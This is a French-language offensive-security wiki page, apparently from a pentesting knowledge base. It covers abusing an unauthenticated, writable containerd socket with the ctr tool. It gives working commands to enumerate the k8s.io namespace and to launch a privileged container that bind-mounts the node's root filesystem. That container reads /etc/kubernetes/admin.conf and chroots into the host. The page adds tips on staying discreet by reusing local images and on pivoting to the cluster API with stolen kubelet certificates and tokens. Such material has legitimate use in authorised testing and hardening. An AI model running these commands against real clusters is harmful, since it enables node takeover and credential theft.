---
title: "Socket containerd : contrôle des conteneurs au niveau du nœud via ctr"
description: "Le socket de contrôle de containerd est le plan de contrôle des conteneurs du nœud, sans aucune authentification au-delà des permissions du système de fichiers. Un processus capable d'y écrire utilise ctr pour lister les espaces de noms et les images et pour lancer un nouveau conteneur privilégié qui monte en bind le système de fichiers racine du nœud, prenant le contrôle du nœud Kubernetes."
keywords:
  - containerd socket
  - ctr
  - kubernetes node
  - privileged container
  - node takeover
---

# Socket containerd

`/run/containerd/containerd.sock` est l'API de contrôle de containerd et, comme le socket Docker, elle n'est protégée que par les permissions du système de fichiers, pas par une authentification. Tout processus capable d'y écrire, qu'il s'agisse d'une charge de travail à laquelle le socket a été fourni comme montage ou d'un processus local au nœud compromis, contrôle containerd et donc le nœud : il peut lancer un conteneur qui monte la racine du nœud et s'exécute en root. Les charges de travail Kubernetes s'exécutent sous l'espace de noms containerd `k8s.io`, qui est l'endroit où résident les images et conteneurs intéressants.

Confirmez l'accès et énumérez :

```bash
S=/run/containerd/containerd.sock
ls -l $S                                            # writable by your UID?
ctr --address $S namespace ls                       # namespaces; k8s.io holds pod containers
ctr --address $S -n k8s.io image ls | head
ctr --address $S -n k8s.io container ls
```

## Prise de contrôle du nœud

```bash
# run a privileged container that bind-mounts the node root filesystem
ctr --address $S -n k8s.io run --rm --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest esc \
  sh -c 'cat /host/etc/kubernetes/admin.conf; chroot /host sh -c id'
# reuse an image already present to avoid a pull
ctr --address $S -n k8s.io image ls | awk 'NR==2{print $1}'
```

Le montage de la racine du nœud expose la configuration et les informations d'authentification du kubelet, les manifestes de pods statiques et chaque secret projeté sur le nœud, ce qui permet généralement d'escalader du nœud vers le cluster.

## Notes d'exploitation

- Le socket n'est pas authentifié ; la permission du système de fichiers sur celui-ci dans votre contexte est le seul verrou, donc `ls -l` vous indique immédiatement si la voie est ouverte.
- Visez l'espace de noms `k8s.io` pour les nœuds Kubernetes ; les conteneurs et images qui s'y trouvent appartiennent aux pods en cours d'exécution et aux composants système du nœud.
- Réutilisez une image déjà présente sur le nœud (`image ls`) pour éviter un téléchargement et rester discret ; n'importe quelle image Linux convient car vous utilisez immédiatement le montage de l'hôte. Le mécanisme d'évasion correspond à [Montage de socket de runtime](../../container-escape/sensitive-mounts/runtime-socket-mount.md).
- Le montage de la racine du nœud est un pivot vers le cluster : lisez `admin.conf`, les certificats client du kubelet et les jetons de compte de service projetés, puis agissez contre le serveur d'API.

## Références

- [containerd: getting started with ctr](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [HackTricks: containerd (ctr)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
